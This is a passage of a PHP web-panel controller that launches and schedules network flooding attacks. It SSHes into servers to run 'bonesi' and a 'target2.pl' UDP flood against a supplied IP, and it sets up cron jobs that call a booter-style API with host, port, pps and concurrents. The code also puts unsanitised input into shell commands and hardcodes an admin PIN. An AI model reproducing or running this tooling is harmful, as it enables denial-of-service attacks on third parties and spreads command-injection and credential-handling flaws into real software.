
            $servers = json_decode(file_get_contents($file_path), true);
            if (!isset($servers[$server])) {
                echo json_encode(['status' => 'error', 'message' => 'Server not found']);
                return;
            }

            $server_info = $servers[$server];
            if ($server_info['pin'] !== $pin) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN']);
                return;
            }

            // First kill any existing sessions
            try {
                $ssh = new SSH2($server_info['ip']);
                if (!$ssh->login($server_info['user'], $server_info['password'])) {
                    throw new Exception('SSH Login Failed');
                }
                $ssh->exec("killall bonesi");
                sleep(1); // Wait for process to be killed
            } catch (Exception $e) {
                // Ignore kill errors
            }

            // Start new UDP session using exact command from get_publicIP
            $command = "nohup perl /root/target2.pl --target_ip=" . $ip . " --num_sessions=1 --protocol=UDP --duration=100";
            
            try {
                // Create new SSH connection
                $ssh = new SSH2($server_info['ip']);
                if (!$ssh->login($server_info['user'], $server_info['password'])) {
                    throw new Exception('SSH Login Failed');
                }

                // Execute the command
                $ssh->exec($command);

                // Track the session using UDP sessions file
                $sessions_file = FCPATH . 'server_config/servers_udp_running.json';
                
                // Create server_config directory if it doesn't exist
                $dir = dirname($sessions_file);
                if (!file_exists($dir)) {
                    if (!mkdir($dir, 0755, true)) {
                        throw new Exception('Failed to create directory: ' . $dir);
                    }
                }

                // Make sure we have write permissions
                $sessions_file = FCPATH . 'server_config/servers_udp_running.json';

                log_message('debug', 'test:Writing to file: ' . $sessions_file);

                // Create empty JSON file if it doesn't exist
                if (!file_exists($sessions_file)) {
                    file_put_contents($sessions_file, '{}');
                    chmod($sessions_file, 0666); // Give full read/write permissions
                }

                // Read existing sessions
                $current_content = file_get_contents($sessions_file);
                $current_sessions = json_decode($current_content, true) ?: [];

                // Create the session data array with simplified structure
                $session_data = array(
                    'ip' => $ip,
                    'server' => $server,
                    'started_at' => date('Y-m-d H:i:s'),
                    'is_running' => true,
                    'command' => $command,
                    'server_ip' => $server_info['ip'],
                    'server_user' => $server_info['user']
                );

                // Initialize current_sessions as an array if it's not already
                if (!is_array($current_sessions)) {
                    $current_sessions = array();
                }

                // Log before assignment
                log_message('debug', 'test: Before Assignment:');
                log_message('debug', 'test: Session Data: ' . json_encode($session_data));
                log_message('debug', 'test: Device Name: ' . $device_name);

                // Assign using array syntax
                $current_sessions[$device_name] = $session_data;

                // Log after assignment
                log_message('debug', 'test: After Assignment:');
                log_message('debug', 'test: Full Array: ' . json_encode($current_sessions));

                // Use the successful JSON encoding approach (without JSON_PRETTY_PRINT)
                $json_content = json_encode($current_sessions);
                log_message('debug', 'test: Final JSON content: ' . $json_content);

                if ($json_content === false) {
                    log_message('error', 'test: JSON encoding failed: ' . json_last_error_msg());
                    throw new Exception('Failed to encode session data');
                }

                // Write the JSON content to file
                $write_result = file_put_contents($sessions_file, $json_content);
                log_message('debug', 'test: Write result: ' . $write_result . ' bytes written');

                if ($write_result === false) {
                    throw new Exception('test:Failed to write session data');
                }

                // Verify the write
                $verification = file_get_contents($sessions_file);
                log_message('debug', 'test: Verification content: ' . $verification);

                // Verify JSON is valid
                $decoded = json_decode($verification, true);
                if ($decoded === null) {
                    throw new Exception('Invalid JSON in verification: ' . json_last_error_msg());
                }

                // Return success only if we can verify the content
                if (strlen($verification) > 0 && $decoded !== null) {
                    echo json_encode([
                        'status' => 'success',
                        'message' => 'UDP session started successfully',
                        'server' => $server,
                        'session_saved' => true
                    ]);
                } else {
                    throw new Exception('Failed to verify session data write');
                }

            } catch (Exception $e) {
                log_message('error', 'test: UDP Session Error: ' . $e->getMessage());
                echo json_encode([
                    'status' => 'error',
                    'message' => 'Failed to execute command: ' . $e->getMessage()
                ]);
            }

        } catch (Exception $e) {
            log_message('error', 'UDP Session Error: ' . $e->getMessage());
            echo json_encode([
                'status' => 'error',
                'message' => 'Server error: ' . $e->getMessage()
            ]);
        }
    }

    public function get_running_udp_sessions()
    {
        try {
            $sessions_file = FCPATH . 'server_config/servers_udp_running.json';
            $running_sessions = [];
            
            if (file_exists($sessions_file)) {
                $content = file_get_contents($sessions_file);
                if ($content) {
                    $running_sessions = json_decode($content, true) ?: [];
                    log_message('debug', 'Initial sessions: ' . print_r($running_sessions, true));
                }
            }

            // For each session, check if process is running
            foreach ($running_sessions as $device => $session) {
                $server_info = $this->get_server_info($session['server']);
                
                if ($server_info) {
                    try {
                        $ssh = new SSH2($server_info['ip']);
                        if (!$ssh->login($server_info['user'], $server_info['password'])) {
                            log_message('error', 'Bonesi: SSH Login failed for ' . $server_info['ip']);
                            continue;
                        }

                        // First check for target2.pl process
                        $check_command = "ps aux | grep -v grep | grep -E 'target2.pl.*" . $session['ip'] . "'";
                        $output = trim($ssh->exec($check_command));
                        log_message('debug', 'Bonesi: Target2 check output for ' . $device . ': ' . $output);

                        // If target2.pl not found, check for bonesi process
                        if (empty($output)) {
                            $check_command = "ps aux | grep -v grep | grep 'bonesi.*" . $session['ip'] . "'";
                            $output = trim($ssh->exec($check_command));
                            log_message('debug', 'Bonesi: Bonesi check output for ' . $device . ': ' . $output);
                        }

                        // Update running status based on either process check
                        $is_running = !empty($output);
                        
                        // Update session information
                        $running_sessions[$device] = array_merge($session, [
                            'is_running' => $is_running,
                            'last_checked' => date('Y-m-d H:i:s'),
                            'process_info' => $output,
                            'status_message' => $is_running ? 'Running' : 'Stopped'
                        ]);

                        if ($is_running) {
                            log_message('debug', 'Bonesi: Process is running for ' . $device);
                            // Extract PID if available
                            if (preg_match('/^\s*\S+\s+(\d+)/', $output, $matches)) {
                                $running_sessions[$device]['pid'] = $matches[1];
                            }
                        } else {
                            log_message('debug', 'Bonesi: No process found for ' . $device);
                        }

                    } catch (Exception $e) {
                        log_message('error', 'Bonesi: Session check error for ' . $device . ': ' . $e->getMessage());
                        $running_sessions[$device]['status_message'] = 'Error checking status';
                    }
                } else {
                    log_message('error', 'Bonesi: Server info not found for: ' . $session['server']);
                    $running_sessions[$device]['status_message'] = 'Server configuration not found';
                }
            }

            // Save updated statuses
            $json_content = json_encode($running_sessions, JSON_PRETTY_PRINT);
            if ($json_content !== false) {
                file_put_contents($sessions_file, $json_content);
                log_message('debug', 'Updated sessions file with new statuses');
            }

            // Return detailed response
            echo json_encode([
                'status' => 'success',
                'sessions' => $running_sessions,
                'timestamp' => date('Y-m-d H:i:s'),
                'debug_info' => [
                    'file_exists' => file_exists($sessions_file),
                    'file_path' => $sessions_file,
                    'session_count' => count($running_sessions)
                ]
            ]);

        } catch (Exception $e) {
            log_message('error', 'Error in get_running_udp_sessions: ' . $e->getMessage());
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    private function get_server_info($server_name)
    {
        $file_path = FCPATH . 'server_config/servers.json';
        if (file_exists($file_path)) {
            $servers = json_decode(file_get_contents($file_path), true);
            log_message('debug', 'Available servers: ' . print_r(array_keys($servers), true));
            
            if (isset($servers[$server_name])) {
                log_message('debug', 'Found server info for ' . $server_name . ': ' . print_r($servers[$server_name], true));
                return $servers[$server_name];
            }
            log_message('error', 'Server not found in config: ' . $server_name);
        } else {
            log_message('error', 'Servers config file not found: ' . $file_path);
        }
        return null;
    }

    public function restart_udp_session()
    {
        try {
            $server = $this->input->post('server');
            $device_name = $this->input->post('device_name');
            $new_ip = $this->input->post('new_ip');

            if (!$server || !$device_name || !$new_ip) {
                echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
                return;
            }

            // Get server info
            $file_path = FCPATH . 'server_config/servers.json';
            $servers = json_decode(file_get_contents($file_path), true);
            
            if (!isset($servers[$server])) {
                echo json_encode(['status' => 'error', 'message' => 'Server not found']);
                return;
            }
            
            $server_info = $servers[$server];

            // Kill existing bonesi process
            $kill_commands = [
                "pkill -f 'bonesi.*{$new_ip}'",
                "pkill -f 'bonesi.*{$device_name}'",
                "killall -9 bonesi",
                "pkill -f 'target2.pl.*{$new_ip}'"
            ];

            foreach ($kill_commands as $command) {
                $this->execute_remote_command(
                    $server_info['ip'],
                    $server_info['user'],
                    $server_info['password'],
                    $command
                );
            }

            // Wait briefly to ensure process is killed
            sleep(2);

            // Start new session with updated IP
            $command = "nohup perl /root/target2.pl --target_ip=" . $new_ip . " --num_sessions=1 --protocol=UDP --duration=100";
            
            $this->execute_remote_command(
                $server_info['ip'],
                $server_info['user'],
                $server_info['password'],
                $command
            );

            // Update session file
            $sessions_file = FCPATH . 'server_config/servers_udp_running.json';
            if (file_exists($sessions_file)) {
                $sessions = json_decode(file_get_contents($sessions_file), true) ?: [];
                $sessions[$device_name] = [
                    'ip' => $new_ip,
                    'server' => $server,
                    'started_at' => date('Y-m-d H:i:s'),
                    'is_running' => true,
                    'command' => $command,
                    'server_ip' => $server_info['ip'],
                    'server_user' => $server_info['user']
                ];
                file_put_contents($sessions_file, json_encode($sessions, JSON_PRETTY_PRINT));
            }

            echo json_encode([
                'status' => 'success',
                'message' => 'Session restarted successfully'
            ]);

        } catch (Exception $e) {
            log_message('error', 'Restart session error: ' . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    
    function test_controller(){

        echo "Test Message";
    }

    // Add this new function to display API-based client apps view
    public function view_client_apps_api()
    {
        // Path to the clients JSON file (same as before)
        $clients_file = FCPATH . 'server_config/client_apps_api.json';
        
        // Path to the API servers JSON file (new location)
        $servers_file = FCPATH . 'server_config/servers_api.json';
        
        // Read client data
        $data['clients'] = [];
        if (file_exists($clients_file)) {
            $content = file_get_contents($clients_file);
            if ($content) {
                $data['clients'] = json_decode($content, true) ?: [];
            }
        }
        
        // Read API server data
        $data['servers'] = [];
        if (file_exists($servers_file)) {
            $content = file_get_contents($servers_file);
            if ($content) {
                $data['servers'] = json_decode($content, true) ?: [];
            }
        }
        
        // Add a flag to indicate this is the API view
        $data['is_api_view'] = true;
        
        // Load the new view with both clients and API servers data
        $this->load->view('Other/get_publicIP_fromapp_api', $data);
    }

    public function add_client_app_api() {
        try {
            $device_name = $this->input->post('device_name');
            $client_ip = $this->input->post('client_ip');
            $api_server = $this->input->post('api_server');
            $admin_pin = $this->input->post('admin_pin');
            $loop_enabled = $this->input->post('loop_enabled') === 'true';
            $interval = intval($this->input->post('interval')) ?: 60; // Default to 60 seconds
            
            // Validate inputs
            if (empty($device_name) || empty($client_ip)) {
                echo json_encode(['status' => 'error', 'message' => 'Device name and IP address are required']);
                return;
            }

            // Validate PIN - you can change this to match your security requirements
            if ($admin_pin !== '654321') {
                echo json_encode(['status' => 'error', 'message' => 'Invalid admin PIN']);
                return;
            }

            // Path to the JSON file
            $file_path = FCPATH . 'server_config/client_apps_api.json';
            $dir_path = FCPATH . 'server_config';

            // Create directory if it doesn't exist
            if (!file_exists($dir_path)) {
                mkdir($dir_path, 0755, true);
            }

            // Read existing data
            $clients = [];
            if (file_exists($file_path)) {
                $content = file_get_contents($file_path);
                if ($content) {
                    $clients = json_decode($content, true) ?: [];
                }
            }

            // Check if device name already exists
            if (isset($clients[$device_name])) {
                echo json_encode(['status' => 'error', 'message' => 'A client with this device name already exists']);
                return;
            }

            // Current timestamp for both first_seen and last_updated
            $current_time = date('Y-m-d H:i:s');
            
            // Create cron job if loop is enabled
            $cron_id = null;
            if ($loop_enabled) {
                $cron_id = $this->create_client_cron_job($device_name, $client_ip, $interval);
                
                if (!$cron_id) {
                    echo json_encode(['status' => 'error', 'message' => 'Failed to create cron job']);
                    return;
                }
                
                // Log cron creation for debugging
                log_message('debug', 'Created cron job for client: ' . $device_name . ' with ID: ' . $cron_id);
            }

            // Add new client with cron job information if applicable
            $clients[$device_name] = [
                'ip' => $client_ip,
                'last_updated' => $current_time,
                'first_seen' => $current_time,
                'loop_enabled' => $loop_enabled,
                'interval' => $interval,
                'cron_id' => $cron_id,
                'api_server' => $api_server
            ];

            // Save updated data
            file_put_contents($file_path, json_encode($clients, JSON_PRETTY_PRINT));

            echo json_encode(['status' => 'success', 'message' => 'Client added successfully']);

        } catch (Exception $e) {
            log_message('error', 'Error adding client: ' . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    /**
     * Create a cron job for a client application
     * Apache Location of Cron JOBS 
     * /var/spool/cron/apache 
     */
    private function create_client_cron_job($device_name, $client_ip, $interval = 60) {
        try {
            // Calculate schedule as before
            $minutes = '*';
            $hours = '*';
            
            if ($interval >= 3600) { 
                $hours = '*/' . floor($interval / 3600);
                $minutes = '0';
            } else if ($interval >= 60) {
                $minutes = '*/' . floor($interval / 60);
            } else {
                $minutes = '*';
            }
            
            $cron_time = "$minutes $hours * * *";
            
            // Create the CORRECT command with absolute paths
            $php_path = "/usr/bin/php";
            $index_path = FCPATH . "index.php"; // This is the main CodeIgniter entry point
            $command = "{$php_path} {$index_path} ZeroTest cron_execute_task {$device_name}";
            
            log_message('debug', "About to create cron job with command: {$command}");
            
            // Create the cron job directly using exec
            // First, get existing crontab
            $temp_file = tempnam(sys_get_temp_dir(), 'cron');
            exec('crontab -l > ' . $temp_file . ' 2>/dev/null');
            
            // Append our new job
            file_put_contents($temp_file, "\n{$cron_time} {$command}\n", FILE_APPEND);
            
            // Install the new crontab
            exec('crontab ' . $temp_file . ' 2>&1', $output, $return_var);
            unlink($temp_file);
            
            // Log the result
            log_message('debug', "Crontab command result: " . implode("\n", $output) . " (return: {$return_var})");
            
            if ($return_var !== 0) {
                log_message('error', "Failed to create cron job: " . implode("\n", $output));
                return null;
            }
            
            $cron_id = uniqid('client_');
            log_message('debug', "Successfully created cron job for {$device_name}");
            
            return $cron_id;
            
        } catch (Exception $e) {
            log_message('error', 'Failed to create cron job: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Execute a scheduled task for a client
     */
    public function execute_client_task($device_name) {
        try {
            // Path to the clients JSON file
            $clients_file = FCPATH . 'server_config/client_apps_api.json';
            
            // Check if file exists
            if (!file_exists($clients_file)) {
                log_message('error', 'Client data file not found when executing task for: ' . $device_name);
                echo json_encode(['status' => 'error', 'message' => 'Client data file not found']);
                return;
            }
            
            // Read client data
            $content = file_get_contents($clients_file);
            $clients = json_decode($content, true) ?: [];
            
            // Check if client exists
            if (!isset($clients[$device_name])) {
                log_message('error', 'Client not found when executing task for: ' . $device_name);
                echo json_encode(['status' => 'error', 'message' => 'Client not found']);
                return;
            }
            
            $client = $clients[$device_name];
            
            // Execute your API session or task here
            // This will depend on how you implement the actual task
            // For example, you might call the API endpoint that starts a session
            
            log_message('debug', 'Executing scheduled task for client: ' . $device_name . ' with IP: ' . $client['ip']);
            
            // Update the last_updated timestamp
            $clients[$device_name]['last_updated'] = date('Y-m-d H:i:s');
            file_put_contents($clients_file, json_encode($clients, JSON_PRETTY_PRINT));
            
            // Return success
            echo json_encode(['status' => 'success', 'message' => 'Task executed successfully']);
            
        } catch (Exception $e) {
            log_message('error', 'Error executing task for client ' . $device_name . ': ' . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    /**
     * Remove a client's cron job
     */
    private function remove_client_cron_job($cron_id) {
        try {
            // Get existing crontab
            $temp_file = tempnam(sys_get_temp_dir(), 'cron');
            exec('crontab -l > ' . $temp_file . ' 2>/dev/null');
            
            // Read the current crontab
            $content = file_get_contents($temp_file);

            log_message('debug', 'Removed cron jobs for client with ID: ' . $cron_id);
            $lines = explode("\n", $content);
            $pattern = "ZeroTest cron_execute_task";
            
            // Filter out lines containing our pattern
            $filtered_lines = array();
            foreach ($lines as $line) {
                if (strpos($line, $pattern) === false) {
                    $filtered_lines[] = $line;
                }
            }
            
            // Write back filtered content
            file_put_contents($temp_file, implode("\n", $filtered_lines));
            
            // Install updated crontab
            exec('crontab ' . $temp_file . ' 2>&1', $output, $return_var);
            unlink($temp_file);
            
            log_message('debug', 'Removed cron jobs for client with ID: ' . $cron_id);
            return ($return_var === 0);
            
        } catch (Exception $e) {
            log_message('error', 'Failed to remove cron job: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Special method to execute client tasks from cron job
     * This method bypasses authentication for CLI requests only
     */
    public function cron_execute_task($device_name = null) {
        // Path to the clients JSON file
        $clients_file = FCPATH . 'server_config/client_apps_api.json';
        
        // Check if file exists
        if (!file_exists($clients_file)) {
            log_message('error', 'Client data file not found when executing task for: ' . $device_name);
            return;
        }
        
        // Read client data
        $content = file_get_contents($clients_file);
        $clients = json_decode($content, true) ?: [];
        
        // Check if client exists
        if (!isset($clients[$device_name])) {
            log_message('error', 'Client not found when executing task for: ' . $device_name);
            return;
        }
        
        $client = $clients[$device_name];
        $target = $client['ip'];
        $api_server_name = $client['api_server'];

        // Check if the target is a domain name and resolve it to IP
        if (!filter_var($target, FILTER_VALIDATE_IP)) {
            $resolved_ip = gethostbyname($target);
            // Check if resolution was successful
            if ($resolved_ip !== $target) {
                $client_ip = $resolved_ip;
                log_message('debug', 'Resolved domain ' . $target . ' to IP: ' . $client_ip);
            } else {
                log_message('error', 'Failed to resolve domain: ' . $target);
                return;
            }
        } else {
            $client_ip = $target;
        }
        
        // Path to the servers JSON file
        $servers_file = FCPATH . 'server_config/servers_api.json';
        
        // Check if servers file exists
        if (!file_exists($servers_file)) {
            log_message('error', 'Servers config file not found: ' . $servers_file);
            return;
        }
        
        // Read server data
        $servers_content = file_get_contents($servers_file);
        $servers = json_decode($servers_content, true) ?: [];
        
        // Check if API server exists
        if (!isset($servers[$api_server_name])) {
            log_message('error', 'API server not found: ' . $api_server_name);
            return;
        }
        
        $api_server = $servers[$api_server_name];
        
        // Prepare API request parameters
        $url = $api_server['url'];
        //$port = 443; // Default port
        $port = mt_rand(1, 65535);
        $time = $client['interval']; // Use the interval from the client data
        
        // Extract additional parameters from the API server details
        $type = $api_server['type'];
        $apikey = $api_server['apikey'];
        $method = $api_server['method'];
        $pps = $api_server['pps'];
        $subnet_mode = $api_server['subnet_mode'];
        $concurrents = $api_server['concurrents'];

        // Construct the API request URL
        $api_request_url = "{$url}type={$type}&apikey={$apikey}&host={$client_ip}&port={$port}&time={$time}&method={$method}&pps={$pps}&subnet_mode={$subnet_mode}&concurrents={$concurrents}";

        // Log the constructed URL for debugging
        log_message('debug', 'Constructed API request URL: ' . $api_request_url);
        
        // Execute the API call
        $response = file_get_contents($api_request_url);
        
        // Log the response
        log_message('debug', 'API response for client ' . $device_name . ': ' . $response);
        
        // Update the last_updated timestamp
        $clients[$device_name]['last_updated'] = date('Y-m-d H:i:s');
        file_put_contents($clients_file, json_encode($clients, JSON_PRETTY_PRINT));
    }

    /**
     * Start an API session for a client (extracted for reuse)
     * This is a wrapper for your existing start_session_api_now function
     */
    private function start_api_session($device_name, $client_ip) {
        try {
            // Log the start of the API session
            file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - Starting API session for $device_name ($client_ip)\n", FILE_APPEND);
            
            // Use appropriate API server from configuration
            $api_servers_file = FCPATH . 'server_config/servers_api.json';
            if (!file_exists($api_servers_file)) {
                file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - API servers file not found\n", FILE_APPEND);
                return ['status' => 'error', 'message' => 'API servers file not found'];
            }
            
            $api_servers = json_decode(file_get_contents($api_servers_file), true) ?: [];
            if (empty($api_servers)) {
                file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - No API servers configured\n", FILE_APPEND);
                return ['status' => 'error', 'message' => 'No API servers configured'];
            }
            
            // Get first API server (or implement logic to choose one)
            $api_server = reset($api_servers);
            $server_name = key($api_servers);
            
            file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - Using API server: $server_name\n", FILE_APPEND);
            
            // Generate a unique session ID
            $session_id = uniqid('api_');
            
            // Use the existing add_running_session function
            // If that function has a different signature, you may need to adjust how you call it
            // or use the one that makes more sense for your application
            
            // Example: Using the second signature (since we're tracking a session, not just an IP)
            $method = 'api_session'; // Placeholder method name
            $api_name = 'client_api'; // Placeholder API name
            $port = 0; // Default port if not applicable
            $duration = 3600; // Default duration (1 hour)
            
            // Add to tracking system based on which implementation you want to use:
            // Option 1: If you want to use the first implementation
            // $this->add_running_session($client_ip, $port, $duration, $api_name, $method);
            
            // Option 2: For the second implementation (comment out Option 1 if using this)
            $this->track_session($device_name, $client_ip, $session_id, $server_name);
            
            file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - API session started: $session_id\n", FILE_APPEND);
            
            return [
                'status' => 'success',
                'message' => 'API session started successfully',
                'session_id' => $session_id,
                'server' => $server_name
            ];
            
        } catch (Exception $e) {
            file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - Error starting API session: " . $e->getMessage() . "\n", FILE_APPEND);
            return ['status' => 'error', 'message' => $e->getMessage()];
        }
    }

    /**
     * Track a client session (renamed to avoid conflict)
     */
    private function track_session($device_name, $client_ip, $session_id, $server_name) {
        try {
            // Path to the sessions tracking file
            $sessions_file = FCPATH . 'server_config/active_sessions.json';
            
            // Initialize or load existing sessions
            $sessions = [];
            if (file_exists($sessions_file)) {
                $content = file_get_contents($sessions_file);
                $sessions = json_decode($content, true) ?: [];
            }
            
            // Add the new session
            $sessions[$session_id] = [
                'device_name' => $device_name,
                'client_ip' => $client_ip,
                'server' => $server_name,
                'start_time' => date('Y-m-d H:i:s'),
                'timestamp' => time(),
                'status' => 'active'
            ];
            
            // Save updated sessions
            file_put_contents($sessions_file, json_encode($sessions, JSON_PRETTY_PRINT));
            
            return true;
        } catch (Exception $e) {
            file_put_contents('/tmp/cron_debug.log', date('Y-m-d H:i:s') . " - Error adding session: " . $e->getMessage() . "\n", FILE_APPEND);
            return false;
        }
    }

    public function delete_client_app_api() {
        try {
            $device_name = $this->input->post('device_name');
            
            if (empty($device_name)) {
                echo json_encode(['status' => 'error', 'message' => 'Device name is required']);
                return;
            }

            // Path to the JSON file
            $file_path = FCPATH . 'server_config/client_apps_api.json';
            
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'Client data file not found']);
                return;
            }

            // Read existing data
            $content = file_get_contents($file_path);
            $clients = json_decode($content, true) ?: [];
            
            // Check if device exists
            if (!isset($clients[$device_name])) {
                echo json_encode(['status' => 'error', 'message' => 'Device not found']);
                return;
            }

            // If this client has a cron job, remove it
            if (!empty($clients[$device_name]['cron_id'])) {
                // Construct the cron job command to remove
                $cron_command = "/usr/bin/php /var/www/html/manager_dev/index.php ZeroTest cron_execute_task {$device_name}";
                log_message('debug', 'Cron command to remove: ' . $cron_command);
                $this->remove_client_cron_bydevice($cron_command); // Call the function to remove the specific cron job
                log_message('debug', 'Removed cron job for client: ' . $device_name);
            }

            // Remove the device
            unset($clients[$device_name]);

            // Save updated data
            file_put_contents($file_path, json_encode($clients, JSON_PRETTY_PRINT));

            echo json_encode(['status' => 'success', 'message' => 'Device removed successfully']);

        } catch (Exception $e) {
            log_message('error', 'Error deleting client: ' . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    private function remove_client_cron_bydevice($cron_command) {
        
        try {
            // Get existing crontab
            $temp_file = tempnam(sys_get_temp_dir(), 'cron');
            exec('crontab -l > ' . $temp_file . ' 2>/dev/null');
            
            // Read the current crontab
            $content = file_get_contents($temp_file);
            log_message('debug', 'Current Crontab Content: ' . $content);
    
            $lines = explode("\n", $content);
            $filtered_lines = array();
            $cron_job_found = false; // Flag to check if the cron job was found
    
            foreach ($lines as $line) {
                // Check if the line contains the specific cron command
                if (strpos($line, $cron_command) === false) {
                    $filtered_lines[] = $line; // Keep this line
                } else {
                    $cron_job_found = true; // Mark that we found the cron job
                }
            }
    
            // If the cron job was found, write back filtered content
            if ($cron_job_found) {
                // Remove any empty lines from the filtered lines
                $filtered_lines = array_filter($filtered_lines, function($line) {
                    return trim($line) !== ''; // Keep only non-empty lines
                });
    
                // Write back to the crontab without adding blank lines
                file_put_contents($temp_file, implode("\n", $filtered_lines) . "\n"); // Ensure there's a newline at the end
                // Install updated crontab
                exec('crontab ' . $temp_file . ' 2>&1', $output, $return_var);
                log_message('debug', 'Removed cron job for command: ' . $cron_command);
            } else {
                log_message('debug', 'No cron job found for command: ' . $cron_command);
            }
    
            unlink($temp_file);
            return ($return_var === 0);
            
        } catch (Exception $e) {
            log_message('error', 'Failed to remove cron job: ' . $e->getMessage());
            return false;
        }

    }


}

?>
